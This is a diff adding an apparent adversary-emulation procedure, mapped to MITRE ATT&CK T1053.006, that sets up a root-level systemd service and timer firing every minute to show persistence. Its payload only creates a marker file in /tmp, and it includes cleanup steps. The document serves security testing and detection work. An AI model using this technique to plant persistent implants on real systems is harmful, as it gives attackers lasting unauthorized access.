@@ -1,0 +1,91 @@
+---
+api_version: 2.0
+uuid: cb34ea0e-1c42-4bed-86a6-8fc22be02748
+name: systemwide-systemd-timers
+description: Add a systemwide systemd timers to run the specified implant.
+requirements:
+  platforms:
+    - os: linux
+  superuser: true
+args:
+  - name: path_to_systemd_service
+    default: "/etc/systemd/system/evil.service"
+  - name: path_to_systemd_timer
+    default: "/etc/systemd/system/evil.timer"
+  - name: systemd_service_name
+    default: "evil.service"
+  - name: systemd_timer_name
+    default: "evil.timer"
+  - name: implant_name
+    default: "/tmp/evil-systemd-timers.sh"
+  - name: user
+    default: "root"
+mitre:
+  tactics:
+    - TA0003 Persistence
+  techniques:
+    - T1053 Scheduled Task/Job
+  subtechniques:
+    - T1053.006 Scheduled Task/Job Systemd Timers
+steps:
+  - name: setup
+    inline: |
+      if ! command -v systemd-run &> /dev/null; then
+          echo "Error: systemd-run is not installed on the current system"
+          exit 1
+      fi
+  - name: create-systemd-service
+    create_file: {{ .Args.path_to_systemd_service }}
+    contents: |
+      [Unit]
+      Description=Evil Systemd Service
+      [Service]
+      Type=simple
+      ExecStart=/bin/touch {{ .Args.implant_name }}
+      User={{ .Args.user }}
+      [Install]
+      WantedBy=multi-user.target
+    mode: 0644
+    cleanup: default
+  - name: create-systemd-timers
+    create_file: {{ .Args.path_to_systemd_timer }}
+    contents: |
+      [Unit]
+      Description=Evil Systemd Timer
+      Requires={{ .Args.systemd_service_name }}
+      [Timer]
+      Unit={{ .Args.systemd_service_name }}
+      OnCalendar=*-*-* *:*:00
+      [Install]
+      WantedBy=timers.target
+    mode: 0644
+    cleanup: default
+  - name: start-systemd-timers
+    inline: |
+      systemctl start {{ .Args.systemd_timer_name }}
+    cleanup:
+      inline: |
+        systemctl stop {{ .Args.systemd_timer_name }}
+  - name: enable-systemd-timers
+    inline: |
+      systemctl enable {{ .Args.systemd_timer_name }}
+    cleanup:
+      inline: |
+        systemctl disable {{ .Args.systemd_timer_name }}
+        systemctl daemon-reload
+  - name: systemctl-daemon-reload
+    inline: |
+      systemctl daemon-reload
+      sleep 5
+  - name: check-success
+    inline: |
+      if [ -e "{{ .Args.implant_name }}" ]; then
+          echo "{{ .Args.implant_name }} exists"
+          exit 0
+      else
+          echo "{{ .Args.implant_name }} does not exist"
+          exit 1
+      fi
+    cleanup:
+      inline: |
+        rm {{ .Args.implant_name }}
